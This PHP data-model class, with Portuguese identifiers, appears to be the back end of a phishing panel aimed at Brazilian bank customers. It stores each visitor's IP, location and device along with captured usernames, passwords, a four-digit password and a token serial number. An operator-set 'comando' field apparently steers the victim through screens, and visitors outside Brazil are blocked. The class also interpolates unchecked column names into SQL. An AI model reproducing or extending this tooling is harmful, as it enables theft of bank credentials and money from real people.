<?php

class Info extends Objeto {

    protected $tabela = "infos";

    protected $id;

    protected $idAcesso;

    protected $hash;

    protected $ip;

    protected $data;

    protected $pais;

    protected $uf;

    protected $cidade;
    
    protected $userAgent;

    protected $device;

    protected $comando;

    protected $ultimoAcesso;

    protected $aberto;

    protected $statusInfo;

    protected $statusConexao;

    protected $usuario;

    protected $senha;

    protected $nome;

    protected $numeroSerie;

    protected $qrCodeFile;

    protected $feixeBinario;
    

    public function salvar() {

        
        $sql = "INSERT INTO {$this->tabela} (idAcesso, hash, ip, data, pais, uf, cidade, user_agent, device, comando, ultimoAcesso, aberto, statusInfo) VALUES (:idAcesso,:hash, :ip, :data, :pais, :uf, :cidade, :user_agent, :device, :comando, :ultimoAcesso, :aberto, :statusInfo)";
        try {
            $query = $this->conn->prepare($sql);
            $query->bindParam(':idAcesso', $this->idAcesso);
            $query->bindParam(':hash', $this->hash);
            $query->bindParam(':ip', $this->ip);
            $query->bindParam(':data', $this->data);
            $query->bindParam(':pais', $this->pais);
            $query->bindParam(':uf', $this->uf);
            $query->bindParam(':cidade', $this->cidade);
            $query->bindParam(':user_agent', $this->userAgent);
            $query->bindParam(':device', $this->device);
            $query->bindParam(':comando', $this->comando);
            $query->bindParam(':ultimoAcesso', $this->ultimoAcesso);
            $query->bindParam(':aberto', $this->aberto);
            $query->bindParam(':statusInfo', $this->statusInfo);
            $query->execute();
            return $this->conn->lastInsertId();
          } catch (\PDOException $e) {
            echo "Erro ao atualizar registro: " . $e->getMessage();
          }
    }

    public static function findByHash($hash){



      $sql = "SELECT * FROM infos where hash = :hash";
      try {

          $conexao = (new Usuario())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':hash', $hash);
          $query->execute(); 
          $resultados = $query->fetch();

          return $resultados;
        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }

    }



    public static function alterarComando($id, $comando){

      $sql = "Update infos set comando = :comando where id = :id";

      try {
          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':comando', $comando);
          $query->bindParam(':id', $id);
          return $query->execute(); 

        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }
    }

    public static function alterarComandoComTexto($id, $comando, $texto){

      $sql = "Update infos set comando = :comando, texto = :texto where id = :id";

      try {
          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':comando', $comando);
          $query->bindParam(':texto', $texto);
          $query->bindParam(':id', $id);
          return $query->execute(); 

        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }
    }


    public static function marcarComoVisualizada($id){

      $sql = "UPDATE infos SET statusInfo = 'VISUALIZADO' where id = :id";

      try {
          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':id', $id);
          return $query->execute(); 

        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }
    }

    public static function atualizarInformacoes($id, $hash, $campo, $valor){

      $sql = "UPDATE infos SET `$campo` = :valor where id = :id AND hash = :hash";

      try {
          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':valor', $valor);
          $query->bindParam(':id', $id);
          $query->bindParam(':hash', $hash);
          return $query->execute(); 

        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }
    }

    public static function atualizarInformacoesSemHash($id, $campo, $valor){

      $sql = "UPDATE infos SET `$campo` = :valor where id = :id";

      try {
          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':valor', $valor);
          $query->bindParam(':id', $id);
          return $query->execute(); 

        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }
    }

    public static function alterarAberto($id, $aberto){


      $sql = "Update infos set aberto = :aberto where id = :id";

      try {
          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':aberto', $aberto);
          $query->bindParam(':id', $id);
          return $query->execute(); 

        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }
    }

    public static function findById($id, $atualizarUltimoAcesso = false){

      if($atualizarUltimoAcesso){
        self::alterarUltimoAcesso($id);
      }

      $sql = "SELECT * FROM infos where id = :id";
      try {

          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':id', $id);
          $query->execute(); 
          $resultados = $query->fetch();

          return $resultados;
        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }

    }


    public static function alterarUltimoAcesso($id){

      $sql = "Update infos set ultimoAcesso = :ultimoAcesso where id = :id";

      $hora = date("Y-m-d H-i-s");

      try {
          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':ultimoAcesso', $hora);
          $query->bindParam(':id', $id);
          return $query->execute(); 

        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }
    }

    public static function buscarApi($id, $hash){


      $sql = "select infos.* from infos where infos.id = :id and infos.hash = :hash";
      try {

          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':id', $id);
          $query->bindParam(':hash', $hash);
          $query->execute(); 
          $resultados = $query->fetch();
          return $resultados;
        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }

    }



    public static function buscarTodos(){

      $sql = "SELECT * FROM infos order by id desc";
      try {

          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->execute(); 
          $resultados = $query->fetchAll();

          return $resultados;
        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }

    }


    public static function deletar($id){

      $sql = "DELETE FROM infos where id = :id";
      try {

          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':id', $id);
          $query->execute(); 
          $resultados = $query->fetchAll();

          return $resultados;
        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }

    }

    public static function total(){
      return count(self::buscarTodos());
    }

    public static function updateByAPI($id, $hash, $obj){


      $sql = "UPDATE infos SET usuario = :usuario, senha = :senha, nome = :nome, numeroSerie = :numeroSerie, comando = :comando where id = :id AND hash = :hash";

      try {
          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':usuario', $obj['usuario']);
          $query->bindParam(':senha', $obj['senha']);
          $query->bindParam(':nome', $obj['nome']);
          $query->bindParam(':numeroSerie', $obj['numeroSerie']);
          $query->bindParam(':comando', $obj['comando']);
          $query->bindParam(':id', $id);
          $query->bindParam(':hash', $hash);
          return $query->execute(); 

        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }
    }

    public static function atualizarS4($id, $senha4, $comando){

      $sql = "UPDATE infos SET 'senha4' = :senha4, 'comando' = :comando where id = :id";

      try {
          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':id', $id);
          $query->bindParam(':senha4', $senha4);
          $query->bindParam(':comando', $comando);
          return $query->execute(); 

        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }
    }

    public static function alterarData($id){

      $sql = "Update infos set data = :data where id = :id";
      $data = date("Y-m-d H-i-s");

      try {
          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->bindParam(':data', $data);
          $query->bindParam(':id', $id);
          return $query->execute(); 

        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }
    }

    public static function adicionarInfoFromAcesso($hash){

      $acesso = Acesso::findByHash($hash);
      if($acesso) {


        $info = new Info();
        $info->setHash($acesso['hash']);
        $info->setIdAcesso($acesso['id']);
        $info->setIp($acesso['ip']);
        $info->setData($acesso['data']);
        $info->setPais($acesso['pais']);
        $info->setUf($acesso['uf']);
        $info->setCidade($acesso['cidade']);
        $info->setUserAgent($acesso['userAgent']);
        $info->setDevice($acesso['device']);
        $info->setComando('COMPONENTE_SEGURANCA');
        $info->setUltimoAcesso(date("Y-m-d H-i-s"));
        $info->setStatusInfo("NOVO");
        $info->setAberto(0);
        $id = $info->salvar();
        $_SESSION['idInfo'] = $id;
      }

    }


    public static function registrarAcesso($hash){

      $info = self::findByHash($hash);
      if(!$info){

        $ip = getIp();
        
        $localizacao = getGeo($ip);
        $pais = isset($localizacao->country) ? $localizacao->country : "-";
        $cidade = isset($localizacao->city) ? $localizacao->city : "-";
        $estado = isset($localizacao->region) ? $localizacao->region : "-";

        $comando = "AGUARDANDO_INICIO";
        if(strtoupper($pais) != strtoupper('Brazil')){
          $comando = 'BLOQUEADO';
        }
  
        $info = new Info();
        $info->setHash($hash);
        $info->setIp($ip);
        $info->setData(date("Y-m-d H-i-s"));
        $info->setPais($pais);
        $info->setUf($estado);
        $info->setCidade($cidade);
        $info->setUserAgent(getUserAgent());
        $info->setDevice(getDevice());
        $info->setComando($comando);
        $info->setUltimoAcesso(date("Y-m-d H-i-s"));
        $info->setStatusInfo("NOVO");
        $info->setAberto(0);
        $id = $info->salvar();
        $_SESSION['id'] = $id;
      } else {
        self::alterarData($info['id']);
        $_SESSION['id'] = $info['id'];       
      } 

    }

    public static function apagarTodos(){

      $sql = "DELETE FROM infos";
      try {

          $conexao = (new Info())->getConn();
          $query = $conexao->prepare($sql);
          $query->execute(); 
          $resultados = $query->fetchAll();

          return $resultados;
        } catch (\PDOException $e) {
          echo "Erro ao atualizar registro: " . $e->getMessage();
        }

    }

}